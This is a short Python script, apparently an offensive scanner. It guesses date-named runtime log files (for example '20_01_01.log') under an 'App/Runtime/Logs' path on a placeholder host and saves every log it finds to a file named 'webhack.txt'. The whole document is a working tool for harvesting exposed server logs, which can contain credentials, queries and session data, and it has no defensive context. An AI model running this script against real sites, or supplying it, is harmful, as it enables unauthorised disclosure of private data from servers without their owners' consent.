import requests
url="http://www.test.com/App/Runtime/Logs"
def addurls(url,year):
    urls=[]
    for i in range(1,13):
        for j in range(1,32): 
            if i<10:
                if j<10:
                    urls.append(url+"/%s_0%s_0%s.log"%(year,i,j))
                else:
                    urls.append(url+"/%s_0%s_%s.log"%(year,i,j))
            else:
                if j<10:
                    urls.append(url+"/%s_%s_0%s.log"%(year,i,j))
                else:
                    urls.append(url+"/%s_%s_%s.log"%(year,i,j))
    return urls

urls=addurls(url,20)
for testurl in urls:
    r=requests.get(testurl)
    if r.status_code==200:
        print(testurl)
        with open("webhack.txt",'a',encoding='utf-8') as f:
            f.write(r.text)
